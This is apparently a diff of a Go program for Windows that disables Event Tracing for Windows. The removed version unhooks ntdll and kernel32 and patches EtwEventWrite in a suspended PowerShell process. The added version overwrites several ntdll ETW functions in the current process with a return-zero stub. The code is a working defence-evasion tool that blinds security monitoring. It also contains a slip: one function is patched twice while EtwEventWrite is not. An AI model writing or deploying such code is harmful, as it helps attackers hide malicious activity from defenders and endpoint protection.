@@ -1,69 +1,57 @@
 package main
 
 import (
+	"encoding/hex"
 	"fmt"
-	"golang.org/x/sys/windows"
-	"log"
 	"syscall"
 	"unsafe"
 )
 
-var(
-	fntdll               = syscall.NewLazyDLL("ntdll.dll")
-	fucketw  = fntdll.NewProc("EtwEventWrite")
+const errnoERROR_IO_PENDING = 997
 
-	k32              = syscall.NewLazyDLL("kernel32.dll")
-	WriteProcessMemory  = k32.NewProc("WriteProcessMemory")
-)
+var errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
 
-func init(){
-	err := RefreshPE(`c:\windows\system32\ntdll.dll`)
-	if err != nil {
-		log.Println("RefreshPE failed:", err)
+var procWriteProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")
+var procEtwNotificationRegister = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwNotificationRegister")
+var procEtwEventRegister = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventRegister")
+var procEtwEventWriteFull = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteFull")
+var procEtwEventWrite = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWrite")
+
+func errnoErr(e syscall.Errno) error {
+	switch e {
+	case 0:
+		return nil
+	case errnoERROR_IO_PENDING:
+		return errERROR_IO_PENDING
 	}
-	err = RefreshPE(`c:\windows\system32\kernel32.dll`)
-	if err != nil {
-		log.Println("RefreshPE failed:", err)
-	}
-	fmt.Println("\nAll Dll Unhooked!\n")
+
+	return e
 }
 
+func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr, lpNumberOfBytesWritten *uintptr) (err error) {
+	r1, _, e1 := syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(lpBuffer)), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)), 0)
+	if r1 == 0 {
+		if e1 != 0 {
+			err = errnoErr(e1)
+		} else {
+			err = syscall.EINVAL
+		}
+	}
+	return
+}
+
+func patchETW() {
+	handle := uintptr(0xffffffffffffffff)
+	dataAddr := []uintptr{ procEtwNotificationRegister.Addr(), procEtwEventRegister.Addr(), procEtwEventWriteFull.Addr(), procEtwEventWriteFull.Addr()}
+	for i, _ := range dataAddr {
+		data, _ := hex.DecodeString("4833C0C3")
+		var nLength uintptr
+		datalength := len(data)
+		r := WriteProcessMemory(handle, dataAddr[i], &data[0], uintptr(uint32(datalength)), &nLength)
+		fmt.Println(r)
+	}
+}
 
 func main(){
-	si := new(syscall.StartupInfo)
-	pi := new(syscall.ProcessInformation)
-
-	err2 := syscall.CreateProcess(nil, syscall.StringToUTF16Ptr("powershell -NoExit"), nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, si, pi)
-	if err2 != nil {
-		panic(err2)
-	}
-	fmt.Println(pi.ProcessId)
-	hProcess := uintptr(pi.Process)
-	hThread := uintptr(pi.Thread)
-
-	fmt.Println("patching .NET ETW ......")
-	var oldProtect uint32
-	var patch = []byte{0xc3}
-
-	e := windows.VirtualProtect(fucketw.Addr(), 1, syscall.PAGE_EXECUTE_READWRITE, &oldProtect)
-	if e != nil {
-		return
-	}
-
-	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch)), uintptr(len(patch)),0)
-
-
-
-	e = windows.VirtualProtect(fucketw.Addr(), 1, oldProtect, &oldProtect)
-	if e != nil {
-		return
-	}
-
-	fmt.Println("ETW patched!!\n")
-
-	windows.ResumeThread(windows.Handle(hThread))
-
-	windows.CloseHandle(windows.Handle(hProcess))
-	windows.CloseHandle(windows.Handle(hThread))
-	return
+	patchETW()
 }
